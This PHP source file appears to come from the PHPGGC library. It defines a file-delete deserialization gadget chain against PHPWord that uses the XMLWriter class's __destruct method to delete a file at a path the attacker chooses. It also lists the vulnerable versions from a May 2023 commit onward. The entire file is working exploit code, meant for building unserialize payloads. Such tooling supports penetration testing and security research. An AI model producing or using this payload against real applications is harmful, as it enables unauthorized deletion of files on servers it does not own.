<?php

namespace GadgetChain\PHPWord;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '*';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '
        Note that some files may not be removed (depends on permissions).
        Target versions: commit 77438025265482ddcf050bce520d3c2b51645108, 30 May 2023 (~1.1.0) <= exploitable.
        Depending on the version, the attribute name may vary between "_tempFileName", "tempFile" and "tempFileName".
    ';

    public function generate(array $parameters)
    {
        return new \PhpOffice\PhpWord\Shared\XMLWriter($parameters['remote_path']);
    }
}
